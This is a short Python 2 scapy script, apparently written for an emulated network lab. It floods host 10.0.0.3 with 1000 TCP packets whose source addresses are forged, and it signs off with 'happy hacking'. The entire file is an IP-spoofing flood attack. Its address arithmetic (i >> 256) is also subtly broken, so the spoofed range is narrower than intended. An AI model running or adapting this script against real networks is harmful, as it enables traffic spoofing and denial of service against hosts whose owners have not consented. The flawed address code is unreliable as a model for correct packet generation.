#!/usr/bin/env python

from scapy.all import *

def main():
	print "Attack start..."
	for i in xrange(1000):
		src = "11.0.%d.%d" % (i >> 256, i % 256)
		p = Ether(dst="00:00:00:00:00:03") / IP(dst="10.0.0.3", src=src) / TCP() / "attack"
		sendp(p, iface="s1-eth1")
	print "Attack finished, happy hacking!"

if __name__ == '__main__':
	main()